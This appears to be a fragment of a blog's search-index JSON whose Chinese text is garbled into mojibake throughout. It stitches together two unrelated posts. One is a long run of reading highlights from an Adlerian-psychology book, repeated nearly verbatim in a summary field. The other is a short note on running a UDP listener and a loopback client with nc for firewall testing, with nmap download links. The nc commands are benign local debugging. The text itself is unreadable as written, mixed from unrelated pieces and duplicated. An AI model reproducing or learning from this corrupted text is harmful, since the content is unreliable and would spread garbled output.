1044å¥å…¨çš„è‡ªå‘æ„Ÿä¸æ˜¯æ¥è‡ªä¸åˆ«äººçš„æ¯”è¾ƒï¼Œè€Œæ˜¯æ¥è‡ªä¸â€œç†æƒ³çš„è‡ªå·±â€çš„æ¯”è¾ƒã€‚æ ‡æ³¨(é»„è‰²) - åœ¨æ„ä½ é•¿ç›¸çš„ï¼Œåªæœ‰ä½ è‡ªå·± \u0026gt; ä½ç½® 1071åœ¨æ„ä½ é•¿ç›¸çš„ï¼Œåªæœ‰ä½ è‡ªå·±æ ‡æ³¨(é»„è‰²) - äººç”Ÿçš„ä¸‰å¤§è¯¾é¢˜ï¼šäº¤å‹è¯¾é¢˜ã€å·¥ä½œè¯¾é¢˜ä»¥åŠçˆ±çš„è¯¾é¢˜ \u0026gt; ä½ç½® 1223äº¤å‹è¯¾é¢˜ã€å·¥ä½œè¯¾é¢˜ä»¥åŠçˆ±çš„è¯¾é¢˜æ ‡æ³¨(é»„è‰²) - äººç”Ÿçš„ä¸‰å¤§è¯¾é¢˜ï¼šäº¤å‹è¯¾é¢˜ã€å·¥ä½œè¯¾é¢˜ä»¥åŠçˆ±çš„è¯¾é¢˜ \u0026gt; ä½ç½® 1224ä¸€åˆ‡çƒ¦æ¼çš†æºäºäººé™…å…³ç³»â€æ ‡æ³¨(é»„è‰²) - æµªæ¼«çš„çº¢çº¿å’Œåšå›ºçš„é”é“¾ \u0026gt; ä½ç½® 1313å½“äººèƒ½å¤Ÿæ„Ÿè§‰åˆ°â€œä¸è¿™ä¸ªäººåœ¨ä¸€èµ·å¯ä»¥æ— æ‹˜æ— æŸâ€çš„æ—¶å€™ï¼Œæ‰èƒ½å¤Ÿä½“ä¼šåˆ°çˆ±ã€‚æ—¢æ²¡æœ‰è‡ªå‘æ„Ÿä¹Ÿä¸å¿…ç‚«è€€ä¼˜è¶Šæ€§ï¼Œèƒ½å¤Ÿä¿æŒä¸€ç§å¹³é™è€Œè‡ªç„¶çš„çŠ¶æ€ã€‚çœŸæ­£çš„çˆ±åº”è¯¥æ˜¯è¿™æ ·çš„ã€‚æ ‡æ³¨(é»„è‰²) - æµªæ¼«çš„çº¢çº¿å’Œåšå›ºçš„é”é“¾ \u0026gt; ä½ç½® 1315æŸç¼šæ˜¯æƒ³è¦æ”¯é…å¯¹æ–¹çš„è¡¨ç°ï¼Œä¹Ÿæ˜¯ä¸€ç§åŸºäºä¸ä¿¡ä»»æ„Ÿçš„æƒ³æ³•ã€‚ä¸ä¸€ä¸ªä¸ä¿¡ä»»è‡ªå·±çš„äººå¤„åœ¨åŒä¸€ä¸ªç©ºé—´é‡Œï¼Œé‚£å°±æ ¹æœ¬ä¸å¯èƒ½ä¿æŒä¸€ç§è‡ªç„¶çŠ¶æ€ã€‚æ ‡æ³¨(é»„è‰²) - â€œäººç”Ÿè°è¨€â€æ•™æˆ‘ä»¬å­¦ä¼šé€ƒé¿ \u0026gt; ä½ç½® 1333é‚£å¹¶ä¸æ˜¯å› ä¸ºæ— æ³•å®¹å¿ Açš„ç¼ºç‚¹æ‰è®¨åŒä»–ï¼Œè€Œæ˜¯ä½ å…ˆæœ‰â€œè¦è®¨åŒ Aâ€è¿™ä¸ªç›®çš„ï¼Œä¹‹åæ‰æ‰¾å‡ºäº†ç¬¦åˆè¿™ä¸ªç›®çš„çš„ç¼ºç‚¹ã€‚æ ‡æ³¨(é»„è‰²) - â€œäººç”Ÿè°è¨€â€æ•™æˆ‘ä»¬å­¦ä¼šé€ƒé¿ \u0026gt; ä½ç½® 1345äººå°±æ˜¯è¿™ä¹ˆä»»æ€§è€Œè‡ªç§çš„ç”Ÿç‰©ï¼Œä¸€æ—¦äº§ç”Ÿè¿™ç§æƒ³æ³•ï¼Œæ— è®ºæ€æ ·éƒ½èƒ½å‘ç°å¯¹æ–¹çš„ç¼ºç‚¹ã€‚æ ‡æ³¨(é»„è‰²) - é˜¿å¾·å‹’å¿ƒç†å­¦æ˜¯â€œå‹‡æ°”çš„å¿ƒç†å­¦â€ \u0026gt; ä½ç½® 1373é’å¹´ï¼šä¹Ÿå°±æ˜¯â€œä¸åœ¨äºè¢«ç»™äºˆäº†ä»€ä¹ˆï¼Œè€Œåœ¨äºå¦‚ä½•å»ä½¿ç”¨è¢«ç»™äºˆçš„ä¸œè¥¿â€é‚£å¥è¯å—ï¼Ÿç¬¬ä¸‰å¤œ è®©å¹²æ¶‰ä½ ç”Ÿæ´»çš„äººè§é¬¼å»æ ‡æ³¨(é»„è‰²) - è‡ªç”±å°±æ˜¯ä¸å†å¯»æ±‚è®¤å¯ï¼Ÿ \u0026gt; ä½ç½® 1405å°±æ˜¯ï¼šâ€œè´§å¸æ˜¯è¢«é“¸é€ çš„è‡ªç”±ã€‚â€å®ƒæ˜¯é™€æ€å¦¥è€¶å¤«æ–¯åŸºçš„å°è¯´ä¸­å‡ºç°çš„ä¸€å¥è¯ã€‚â€œè¢«é“¸é€ çš„è‡ªç”±â€è¿™ç§è¯´æ³•æ˜¯ä½•ç­‰çš„ç—›å¿«å•Šï¼æˆ‘è®¤ä¸ºè¿™æ˜¯ä¸€å¥éå¸¸ç²¾è¾Ÿçš„è¯ï¼Œå®ƒä¸€è¯­é“ç ´äº†è´§å¸çš„æ ‡æ³¨(é»„è‰²) - è‡ªç”±å°±æ˜¯ä¸å†å¯»æ±‚è®¤å¯ï¼Ÿ \u0026gt; ä½ç½® 1449é˜¿å¾·å‹’å¿ƒç†å­¦å¦å®šå¯»æ±‚ä»–äººçš„è®¤å¯ã€‚æ ‡æ³¨(é»„è‰²) - è¦ä¸è¦æ´»åœ¨åˆ«äººçš„æœŸå¾…ä¸­ï¼Ÿ \u0026gt; ä½ç½® 1479åœ¨çŠ¹å¤ªæ•™æ•™ä¹‰ä¸­æœ‰è¿™ä¹ˆä¸€å¥è¯ï¼šâ€œå€˜è‹¥è‡ªå·±éƒ½ä¸ä¸ºè‡ªå·±æ´»å‡ºè‡ªå·±çš„äººç”Ÿï¼Œé‚£è¿˜æœ‰è°ä¼šä¸ºè‡ªå·±è€Œæ´»å‘¢ï¼Ÿâ€ä½ å°±æ´»åœ¨è‡ªå·±çš„äººç”Ÿä¸­ã€‚ä¹¦ç­¾ - è¦ä¸è¦æ´»åœ¨åˆ«äººçš„æœŸå¾…ä¸­ï¼Ÿ \u0026gt; ä½ç½® 1498æ ‡æ³¨(é»„è‰²) - ç æ–­â€œæ ¼å°”è¿ªå¥¥æ–¯ç»³ç»“â€ \u0026gt; ä½ç½® 1689å¦å®šåŸå› è®ºã€å¦å®šç²¾ç¥åˆ›ä¼¤ã€é‡‡å–ç›®çš„è®ºï¼›è®¤ä¸ºäººçš„çƒ¦æ¼å…¨éƒ½æ˜¯å…³äºäººé™…å…³ç³»çš„çƒ¦æ¼ï¼›æ­¤å¤–ï¼Œä¸å¯»æ±‚è®¤å¯æˆ–è€…è¯¾é¢˜åˆ†ç¦»ä¹Ÿå…¨éƒ½æ˜¯åå¸¸è¯†çš„ç†è®ºã€‚æ ‡æ³¨(é»„è‰²) - è‡ªç”±å°±æ˜¯è¢«åˆ«äººè®¨åŒ \u0026gt; ä½ç½® 1764è‡ªç”±å°±æ˜¯è¢«åˆ«äººè®¨åŒâ€ã€‚æ ‡æ³¨(é»„è‰²) - è‡ªç”±å°±æ˜¯è¢«åˆ«äººè®¨åŒ \u0026gt; ä½ç½® 1785ä¸ç•æƒ§è¢«äººè®¨åŒè€Œæ˜¯å‹‡å¾€ç›´å‰ï¼Œä¸éšæ³¢é€æµè€Œæ˜¯æ¿€æµå‹‡è¿›ï¼Œè¿™æ‰æ˜¯å¯¹äººè€Œè¨€çš„è‡ªç”±ã€‚ç¬¬äº”å¤œ è®¤çœŸçš„äººç”Ÿâ€œæ´»åœ¨å½“ä¸‹â€æ ‡æ³¨(é»„è‰²) - å¯¹å†³â€œäººç”Ÿæœ€å¤§çš„è°è¨€â€ \u0026gt; ä½ç½® 2910äººç”Ÿä¸­æœ€å¤§çš„è°è¨€å°±æ˜¯ä¸æ´»åœ¨â€œæ­¤æ—¶æ­¤åˆ»â€ã€‚çº ç»“è¿‡å»ã€å…³æ³¨æœªæ¥ï¼ŒæŠŠå¾®å¼±è€Œæ¨¡ç³Šçš„å…‰æ‰“å‘äººç”Ÿæ•´ä½“ï¼Œè‡ªè®¤ä¸ºçœ‹åˆ°äº†äº›ä»€ä¹ˆã€‚æ ‡æ³¨(é»„è‰²) - å¯¹å†³â€œäººç”Ÿæœ€å¤§çš„è°è¨€â€ \u0026gt; ä½ç½® 2916å› ä¸ºè¿‡å»å’Œæœªæ¥æ ¹æœ¬ä¸å­˜åœ¨ï¼Œæ‰€ä»¥æ‰è¦è°ˆç°åœ¨ã€‚èµ·å†³å®šä½œç”¨çš„æ—¢ä¸æ˜¯æ˜¨å¤©ä¹Ÿä¸æ˜¯æ˜å¤©ï¼Œè€Œæ˜¯â€œæ­¤æ—¶æ­¤åˆ»â€ã€‚æ ‡æ³¨(é»„è‰²) - äººç”Ÿçš„æ„ä¹‰ï¼Œç”±ä½ è‡ªå·±å†³å®š \u0026gt; ä½ç½® 2982å¿…é¡»æœ‰äººå¼€å§‹ã€‚å³ä½¿åˆ«äººä¸åˆä½œï¼Œé‚£ä¹Ÿä¸ä½ æ— å…³ã€‚æˆ‘çš„æ„è§å°±æ˜¯è¿™æ ·ã€‚åº”è¯¥ç”±ä½ å¼€å§‹ï¼Œä¸ç”¨å»è€ƒè™‘åˆ«äººæ˜¯å¦åˆä½œã€‚â€åè®°æ ‡æ³¨(é»„è‰²) - ä½ç½® 3011ä¸€åˆ‡çƒ¦æ¼çš†æºäºäººé™…å…³ç³»â€â€œäººå¯ä»¥éšæ—¶æ”¹å˜å¹¶èƒ½å¤Ÿè·å¾—å¹¸ç¦â€â€œé—®é¢˜ä¸åœ¨äºèƒ½åŠ›è€Œåœ¨äºå‹‡æ°”\n","permalink":"https://wdd.js.org/posts/2021/06/ineayu/","summary":"å¼•è¨€æ ‡æ³¨(é»„è‰²) - ä½ç½® 225äººå¹¶ä¸æ˜¯ä½åœ¨å®¢è§‚çš„ä¸–ç•Œï¼Œè€Œæ˜¯ä½åœ¨è‡ªå·±è¥é€ çš„ä¸»è§‚ä¸–ç•Œé‡Œã€‚ç¬¬ä¸€å¤œ æˆ‘ä»¬çš„ä¸å¹¸æ˜¯è°çš„é”™ï¼Ÿæ ‡æ³¨(é»„è‰²) - ä¸ä¸ºäººçŸ¥çš„å¿ƒç†å­¦â€œç¬¬ä¸‰å·¨å¤´â€ \u0026gt; ä½ç½® 335ä½†åœ¨ä¸–ç•Œä¸Šï¼Œé˜¿å¾·å‹’æ˜¯ä¸å¼—æ´›ä¼Šå¾·ã€è£æ ¼å¹¶åˆ—çš„ä¸‰å¤§å·¨å¤´ä¹‹ä¸€ã€‚æ ‡æ³¨(é»„è‰²) - å†æ€ä¹ˆâ€œæ‰¾åŸå› â€ï¼Œä¹Ÿæ²¡æ³•æ”¹å˜ä¸€ä¸ªäºº \u0026gt; ä½ç½® 377å¦‚æœæ‰€æœ‰äººçš„â€œç°åœ¨â€éƒ½ç”±â€œè¿‡å»â€æ‰€å†³å®šï¼Œé‚£å²‚ä¸æ˜¯å¾ˆå¥‡æ€ªå—ï¼Ÿæ ‡æ³¨(é»„è‰²) - å†æ€ä¹ˆâ€œæ‰¾åŸå› â€ï¼Œä¹Ÿæ²¡æ³•æ”¹å˜ä¸€ä¸ªäºº \u0026gt; ä½ç½® 384æ‚¨æ˜¯è¯´ä¸è¿‡å»æ²¡æœ‰å…³ç³»ï¼Ÿå“²äººï¼šæ˜¯çš„ï¼Œè¿™å°±æ˜¯é˜¿å¾·å‹’å¿ƒç†å­¦çš„ç«‹åœºã€‚æ ‡æ³¨(é»„è‰²) - å†æ€ä¹ˆâ€œæ‰¾åŸå› â€ï¼Œä¹Ÿæ²¡æ³•æ”¹å˜ä¸€ä¸ªäºº \u0026gt; ä½ç½® 389é˜¿å¾·å‹’å¿ƒç†å­¦è€ƒè™‘çš„ä¸æ˜¯è¿‡å»çš„â€œåŸå› â€ï¼Œè€Œæ˜¯ç°åœ¨çš„â€œç›®çš„â€ã€‚æ ‡æ³¨(é»„è‰²) - å¿ƒç†åˆ›ä¼¤å¹¶ä¸å­˜åœ¨ \u0026gt; ä½ç½® 417ä»»ä½•ç»å†æœ¬èº«å¹¶ä¸æ˜¯æˆåŠŸæˆ–è€…å¤±è´¥çš„åŸå› ã€‚æˆ‘ä»¬å¹¶éå› ä¸ºè‡ªèº«ç»å†ä¸­çš„åˆºæ¿€â€”â€”æ‰€è°“çš„å¿ƒç†åˆ›ä¼¤â€”â€”è€Œç—›è‹¦ï¼Œäº‹å®ä¸Šæˆ‘ä»¬ä¼šä»ç»å†ä¸­å‘ç°ç¬¦åˆè‡ªå·±ç›®çš„çš„å› ç´ ã€‚å†³å®šæˆ‘ä»¬è‡ªèº«çš„ä¸æ˜¯è¿‡å»çš„ç»å†ï¼Œè€Œæ˜¯æˆ‘ä»¬è‡ªå·±èµ‹äºˆç»å†çš„æ„ä¹‰ã€‚â€æ ‡æ³¨(é»„è‰²) - å¿ƒç†åˆ›ä¼¤å¹¶ä¸å­˜åœ¨ \u0026gt; ä½ç½® 423äººç”Ÿä¸æ˜¯ç”±åˆ«äººèµ‹äºˆçš„ï¼Œè€Œæ˜¯ç”±è‡ªå·±é€‰æ‹©çš„ï¼Œæ˜¯è‡ªå·±é€‰æ‹©è‡ªå·±å¦‚ä½•ç”Ÿæ´»ã€‚æ ‡æ³¨(é»„è‰²) - å¿ƒç†åˆ›ä¼¤å¹¶ä¸å­˜åœ¨ \u0026gt; ä½ç½® 443æˆ‘ä»¬å¤§å®¶éƒ½æ˜¯åœ¨ä¸ºäº†æŸç§â€œç›®çš„â€è€Œæ´»ç€ã€‚è¿™å°±æ˜¯ç›®çš„è®ºã€‚æ ‡æ³¨(é»„è‰²) - ä½ çš„ä¸å¹¸ï¼Œçš†æ˜¯è‡ªå·±â€œé€‰æ‹©â€çš„ \u0026gt; ä½ç½® 599è€Œæ˜¯å› ä¸ºä½ è®¤ä¸ºâ€œä¸å¹¸â€å¯¹ä½ è‡ªèº«è€Œè¨€æ˜¯ä¸€ç§â€œå–„â€ã€‚æ ‡æ³¨(é»„è‰²) - äººä»¬å¸¸å¸¸ä¸‹å®šå†³å¿ƒâ€œä¸æ”¹å˜â€ \u0026gt; ä½ç½® 614æŸäººå¦‚ä½•çœ‹â€œä¸–ç•Œâ€ï¼Œåˆå¦‚ä½•çœ‹â€œè‡ªå·±â€ï¼ŒæŠŠè¿™äº›â€œèµ‹äºˆæ„ä¹‰çš„æ–¹å¼â€æ±‡é›†èµ·æ¥çš„æ¦‚å¿µå°±å¯ä»¥ç†è§£ä¸ºç”Ÿæ´»æ–¹å¼ã€‚æ ‡æ³¨(é»„è‰²) - ä½ çš„äººç”Ÿå–å†³äºâ€œå½“ä¸‹â€ \u0026gt; ä½ç½® 706æ— è®ºä¹‹å‰çš„äººç”Ÿå‘ç”Ÿè¿‡ä»€ä¹ˆï¼Œéƒ½å¯¹ä»Šåçš„äººç”Ÿå¦‚ä½•åº¦è¿‡æ²¡æœ‰å½±å“ã€‚â€å†³å®šè‡ªå·±äººç”Ÿçš„æ˜¯æ´»åœ¨â€œæ­¤æ—¶æ­¤åˆ»â€çš„ä½ è‡ªå·±ã€‚ç¬¬äºŒå¤œ ä¸€åˆ‡çƒ¦æ¼éƒ½æ¥è‡ªäººé™…å…³ç³»æ ‡æ³¨(é»„è‰²) - ä¸ºä»€ä¹ˆè®¨åŒè‡ªå·±ï¼Ÿ \u0026gt; ä½ç½® 780é˜¿å¾·å‹’å¿ƒç†å­¦æŠŠè¿™å«ä½œâ€œé¼“åŠ±â€ã€‚é’å¹´ï¼šé¼“åŠ±ï¼Ÿä¹¦ç­¾ - ä¸€åˆ‡çƒ¦æ¼éƒ½æ˜¯äººé™…å…³ç³»çš„çƒ¦æ¼ \u0026gt; ä½ç½® 834æ ‡æ³¨(é»„è‰²) - è‡ªå‘æƒ…ç»“åªæ˜¯ä¸€ç§å€Ÿå£ \u0026gt; ä½ç½® 936è‡ªå‘æƒ…ç»“æ˜¯æŒ‡æŠŠè‡ªå·±çš„è‡ªå‘æ„Ÿå½“ä½œæŸç§å€Ÿå£ä½¿ç”¨çš„çŠ¶æ€ã€‚æ ‡æ³¨(é»„è‰²) - è‡ªå‘æƒ…ç»“åªæ˜¯ä¸€ç§å€Ÿå£ \u0026gt; ä½ç½® 943å¤–éƒ¨å› æœå¾‹â€ä¸€è¯æ¥è¿›è¡Œè¯´æ˜ã€‚æ„æ€å°±æ˜¯ï¼šå°†åŸæœ¬æ²¡æœ‰ä»»ä½•å› æœå…³ç³»çš„äº‹æƒ…è§£é‡Šæˆä¼¼ä¹æœ‰é‡å¤§å› æœå…³ç³»ä¸€æ ·ã€‚æ ‡æ³¨(é»„è‰²) - äººç”Ÿä¸æ˜¯ä¸ä»–äººçš„æ¯”èµ› \u0026gt; ä½ç½® 1044å¥å…¨çš„è‡ªå‘æ„Ÿä¸æ˜¯æ¥è‡ªä¸åˆ«äººçš„æ¯”è¾ƒï¼Œè€Œæ˜¯æ¥è‡ªä¸â€œç†æƒ³çš„è‡ªå·±â€çš„æ¯”è¾ƒã€‚æ ‡æ³¨(é»„è‰²) - åœ¨æ„ä½ é•¿ç›¸çš„ï¼Œåªæœ‰ä½ è‡ªå·± \u0026gt; ä½ç½® 1071åœ¨æ„ä½ é•¿ç›¸çš„ï¼Œåªæœ‰ä½ è‡ªå·±æ ‡æ³¨(é»„è‰²) - äººç”Ÿçš„ä¸‰å¤§è¯¾é¢˜ï¼šäº¤å‹è¯¾é¢˜ã€å·¥ä½œè¯¾é¢˜ä»¥åŠçˆ±çš„è¯¾é¢˜ \u0026gt; ä½ç½® 1223äº¤å‹è¯¾é¢˜ã€å·¥ä½œè¯¾é¢˜ä»¥åŠçˆ±çš„è¯¾é¢˜æ ‡æ³¨(é»„è‰²) - äººç”Ÿçš„ä¸‰å¤§è¯¾é¢˜ï¼šäº¤å‹è¯¾é¢˜ã€å·¥ä½œè¯¾é¢˜ä»¥åŠçˆ±çš„è¯¾é¢˜ \u0026gt; ä½ç½® 1224ä¸€åˆ‡çƒ¦æ¼çš†æºäºäººé™…å…³ç³»â€æ ‡æ³¨(é»„è‰²) - æµªæ¼«çš„çº¢çº¿å’Œåšå›ºçš„é”é“¾ \u0026gt; ä½ç½® 1313å½“äººèƒ½å¤Ÿæ„Ÿè§‰åˆ°â€œä¸è¿™ä¸ªäººåœ¨ä¸€èµ·å¯ä»¥æ— æ‹˜æ— æŸâ€çš„æ—¶å€™ï¼Œæ‰èƒ½å¤Ÿä½“ä¼šåˆ°çˆ±ã€‚æ—¢æ²¡æœ‰è‡ªå‘æ„Ÿä¹Ÿä¸å¿…ç‚«è€€ä¼˜è¶Šæ€§ï¼Œèƒ½å¤Ÿä¿æŒä¸€ç§å¹³é™è€Œè‡ªç„¶çš„çŠ¶æ€ã€‚çœŸæ­£çš„çˆ±åº”è¯¥æ˜¯è¿™æ ·çš„ã€‚æ ‡æ³¨(é»„è‰²) - æµªæ¼«çš„çº¢çº¿å’Œåšå›ºçš„é”é“¾ \u0026gt; ä½ç½® 1315æŸç¼šæ˜¯æƒ³è¦æ”¯é…å¯¹æ–¹çš„è¡¨ç°ï¼Œä¹Ÿæ˜¯ä¸€ç§åŸºäºä¸ä¿¡ä»»æ„Ÿçš„æƒ³æ³•ã€‚ä¸ä¸€ä¸ªä¸ä¿¡ä»»è‡ªå·±çš„äººå¤„åœ¨åŒä¸€ä¸ªç©ºé—´é‡Œï¼Œé‚£å°±æ ¹æœ¬ä¸å¯èƒ½ä¿æŒä¸€ç§è‡ªç„¶çŠ¶æ€ã€‚æ ‡æ³¨(é»„è‰²) - â€œäººç”Ÿè°è¨€â€æ•™æˆ‘ä»¬å­¦ä¼šé€ƒé¿ \u0026gt; ä½ç½® 1333é‚£å¹¶ä¸æ˜¯å› ä¸ºæ— æ³•å®¹å¿ Açš„ç¼ºç‚¹æ‰è®¨åŒä»–ï¼Œè€Œæ˜¯ä½ å…ˆæœ‰â€œè¦è®¨åŒ Aâ€è¿™ä¸ªç›®çš„ï¼Œä¹‹åæ‰æ‰¾å‡ºäº†ç¬¦åˆè¿™ä¸ªç›®çš„çš„ç¼ºç‚¹ã€‚æ ‡æ³¨(é»„è‰²) - â€œäººç”Ÿè°è¨€â€æ•™æˆ‘ä»¬å­¦ä¼šé€ƒé¿ \u0026gt; ä½ç½® 1345äººå°±æ˜¯è¿™ä¹ˆä»»æ€§è€Œè‡ªç§çš„ç”Ÿç‰©ï¼Œä¸€æ—¦äº§ç”Ÿè¿™ç§æƒ³æ³•ï¼Œæ— è®ºæ€æ ·éƒ½èƒ½å‘ç°å¯¹æ–¹çš„ç¼ºç‚¹ã€‚æ ‡æ³¨(é»„è‰²) - é˜¿å¾·å‹’å¿ƒç†å­¦æ˜¯â€œå‹‡æ°”çš„å¿ƒç†å­¦â€ \u0026gt; ä½ç½® 1373é’å¹´ï¼šä¹Ÿå°±æ˜¯â€œä¸åœ¨äºè¢«ç»™äºˆäº†ä»€ä¹ˆï¼Œè€Œåœ¨äºå¦‚ä½•å»ä½¿ç”¨è¢«ç»™äºˆçš„ä¸œè¥¿â€é‚£å¥è¯å—ï¼Ÿç¬¬ä¸‰å¤œ è®©å¹²æ¶‰ä½ ç”Ÿæ´»çš„äººè§é¬¼å»æ ‡æ³¨(é»„è‰²) - è‡ªç”±å°±æ˜¯ä¸å†å¯»æ±‚è®¤å¯ï¼Ÿ \u0026gt; ä½ç½® 1405å°±æ˜¯ï¼šâ€œè´§å¸æ˜¯è¢«é“¸é€ çš„è‡ªç”±ã€‚â€å®ƒæ˜¯é™€æ€å¦¥è€¶å¤«æ–¯åŸºçš„å°è¯´ä¸­å‡ºç°çš„ä¸€å¥è¯ã€‚â€œè¢«é“¸é€ çš„è‡ªç”±â€è¿™ç§è¯´æ³•æ˜¯ä½•ç­‰çš„ç—›å¿«å•Šï¼æˆ‘è®¤ä¸ºè¿™æ˜¯ä¸€å¥éå¸¸ç²¾è¾Ÿçš„è¯ï¼Œå®ƒä¸€è¯­é“ç ´äº†è´§å¸çš„æ ‡æ³¨(é»„è‰²) - è‡ªç”±å°±æ˜¯ä¸å†å¯»æ±‚è®¤å¯ï¼Ÿ \u0026gt; ä½ç½® 1449é˜¿å¾·å‹’å¿ƒç†å­¦å¦å®šå¯»æ±‚ä»–äººçš„è®¤å¯ã€‚æ ‡æ³¨(é»„è‰²) - è¦ä¸è¦æ´»åœ¨åˆ«äººçš„æœŸå¾…ä¸­ï¼Ÿ \u0026gt; ä½ç½® 1479åœ¨çŠ¹å¤ªæ•™æ•™ä¹‰ä¸­æœ‰è¿™ä¹ˆä¸€å¥è¯ï¼šâ€œå€˜è‹¥è‡ªå·±éƒ½ä¸ä¸ºè‡ªå·±æ´»å‡ºè‡ªå·±çš„äººç”Ÿï¼Œé‚£è¿˜æœ‰è°ä¼šä¸ºè‡ªå·±è€Œæ´»å‘¢ï¼Ÿâ€ä½ å°±æ´»åœ¨è‡ªå·±çš„äººç”Ÿä¸­ã€‚ä¹¦ç­¾ - è¦ä¸è¦æ´»åœ¨åˆ«äººçš„æœŸå¾…ä¸­ï¼Ÿ \u0026gt; ä½ç½® 1498æ ‡æ³¨(é»„è‰²) - ç æ–­â€œæ ¼å°”è¿ªå¥¥æ–¯ç»³ç»“â€ \u0026gt; ä½ç½® 1689å¦å®šåŸå› è®ºã€å¦å®šç²¾ç¥åˆ›ä¼¤ã€é‡‡å–ç›®çš„è®ºï¼›è®¤ä¸ºäººçš„çƒ¦æ¼å…¨éƒ½æ˜¯å…³äºäººé™…å…³ç³»çš„çƒ¦æ¼ï¼›æ­¤å¤–ï¼Œä¸å¯»æ±‚è®¤å¯æˆ–è€…è¯¾é¢˜åˆ†ç¦»ä¹Ÿå…¨éƒ½æ˜¯åå¸¸è¯†çš„ç†è®ºã€‚æ ‡æ³¨(é»„è‰²) - è‡ªç”±å°±æ˜¯è¢«åˆ«äººè®¨åŒ \u0026gt; ä½ç½® 1764è‡ªç”±å°±æ˜¯è¢«åˆ«äººè®¨åŒâ€ã€‚æ ‡æ³¨(é»„è‰²) - è‡ªç”±å°±æ˜¯è¢«åˆ«äººè®¨åŒ \u0026gt; ä½ç½® 1785ä¸ç•æƒ§è¢«äººè®¨åŒè€Œæ˜¯å‹‡å¾€ç›´å‰ï¼Œä¸éšæ³¢é€æµè€Œæ˜¯æ¿€æµå‹‡è¿›ï¼Œè¿™æ‰æ˜¯å¯¹äººè€Œè¨€çš„è‡ªç”±ã€‚ç¬¬äº”å¤œ è®¤çœŸçš„äººç”Ÿâ€œæ´»åœ¨å½“ä¸‹â€æ ‡æ³¨(é»„è‰²) - å¯¹å†³â€œäººç”Ÿæœ€å¤§çš„è°è¨€â€ \u0026gt; ä½ç½® 2910äººç”Ÿä¸­æœ€å¤§çš„è°è¨€å°±æ˜¯ä¸æ´»åœ¨â€œæ­¤æ—¶æ­¤åˆ»â€ã€‚çº ç»“è¿‡å»ã€å…³æ³¨æœªæ¥ï¼ŒæŠŠå¾®å¼±è€Œæ¨¡ç³Šçš„å…‰æ‰“å‘äººç”Ÿæ•´ä½“ï¼Œè‡ªè®¤ä¸ºçœ‹åˆ°äº†äº›ä»€ä¹ˆã€‚æ ‡æ³¨(é»„è‰²) - å¯¹å†³â€œäººç”Ÿæœ€å¤§çš„è°è¨€â€ \u0026gt; ä½ç½® 2916å› ä¸ºè¿‡å»å’Œæœªæ¥æ ¹æœ¬ä¸å­˜åœ¨ï¼Œæ‰€ä»¥æ‰è¦è°ˆç°åœ¨ã€‚èµ·å†³å®šä½œç”¨çš„æ—¢ä¸æ˜¯æ˜¨å¤©ä¹Ÿä¸æ˜¯æ˜å¤©ï¼Œè€Œæ˜¯â€œæ­¤æ—¶æ­¤åˆ»â€ã€‚æ ‡æ³¨(é»„è‰²) - äººç”Ÿçš„æ„ä¹‰ï¼Œç”±ä½ è‡ªå·±å†³å®š \u0026gt; ä½ç½® 2982å¿…é¡»æœ‰äººå¼€å§‹ã€‚å³ä½¿åˆ«äººä¸åˆä½œï¼Œé‚£ä¹Ÿä¸ä½ æ— å…³ã€‚æˆ‘çš„æ„è§å°±æ˜¯è¿™æ ·ã€‚åº”è¯¥ç”±ä½ å¼€å§‹ï¼Œä¸ç”¨å»è€ƒè™‘åˆ«äººæ˜¯å¦åˆä½œã€‚â€åè®°æ ‡æ³¨(é»„è‰²) - ä½ç½® 3011ä¸€åˆ‡çƒ¦æ¼çš†æºäºäººé™…å…³ç³»â€â€œäººå¯ä»¥éšæ—¶æ”¹å˜å¹¶èƒ½å¤Ÿè·å¾—å¹¸ç¦â€â€œé—®é¢˜ä¸åœ¨äºèƒ½åŠ›è€Œåœ¨äºå‹‡æ°”","title":"è¢«è®¨åŒçš„å‹‡æ°”ï¼šâ€œè‡ªæˆ‘å¯å‘ä¹‹çˆ¶â€é˜¿å¾·å‹’çš„å“²å­¦è¯¾"},{"content":"æœ‰æ—¶å€™ï¼Œå®¢æˆ·ç«¯çš„udpåŒ…è¢«ä¸­é—´çš„é˜²ç«å¢™æ‹¦æˆªäº†ï¼Œåœ¨linuxä¸Šå¯ä»¥å¾ˆç®€å•çš„ç”¨ncå¯åŠ¨ä¸€ä¸ªudp server\n# å¯åŠ¨udp server ç›‘å¬8888ç«¯å£ nc -ulp 20000 # å¯åŠ¨udp client nc -u 127.0.0.1 20000 åœ¨linuxä¸Šå¯åŠ¨nc udp serverå¾ˆç®€å•ï¼Œä½†æ˜¯åœ¨windowsä¸Šï¼Œæ²¡åŠæ³•å®‰è£…ncå•Šï¼ŸğŸ˜­\nå³°å›è·¯è½¬ https://nmap.org/download.html åœ¨æŸ¥çœ‹äº†ncçš„å®˜ç½‘ä¹‹åï¼Œå‘ç°ncå®é™…ä¸Šä¹Ÿæä¾›äº†windowsçš„ç¨‹åºï¼Œæœ‰ä¸¤ç§ç‰ˆæœ¬ã€‚\næœ‰GUIç•Œé¢çš„ï¼Œä½¿ç”¨å‹å¥½ï¼Œå®‰è£…åŒ…æ¯”è¾ƒå¤§ https://nmap.org/dist/nmap-7.91-setup.exe ä»…ä»…åœ¨å‘½ä»¤è¡Œä¸‹æ‰§è¡Œï¼Œåˆšå¥½æ»¡è¶³éœ€æ±‚ https://nmap.org/dist/nmap-7.91-win32.zip çœ‹çœ‹å¸¦GUIç•Œé¢çš„\né™„ä»¶ nmap-7.91-win32.zip ","permalink":"https://wdd.js.org/posts/2021/06/ex5n9h/","summary":"æœ‰æ—¶å€™ï¼Œå®¢æˆ·ç«¯çš„udpåŒ…è¢«ä¸­é—´çš„é˜²ç«å¢™æ‹¦æˆªäº†ï¼Œåœ¨linuxä¸Šå¯ä»¥å¾ˆç®€å•çš„ç”¨ncå¯åŠ¨ä¸€ä¸ªudp server\n# å¯åŠ¨udp server ç›‘å¬8888ç«¯å£ nc -ulp 20000 # å¯åŠ¨udp client nc -u 127.0.0.1 20000 åœ¨linuxä¸Šå¯åŠ¨nc udp serverå¾ˆç®€å•ï¼Œä½†æ˜¯åœ¨windowsä¸Šï¼Œæ²¡åŠæ³•å®‰è£…ncå•Šï¼ŸğŸ˜­\nå³°å›è·¯è½¬ https://nmap.org/download.html 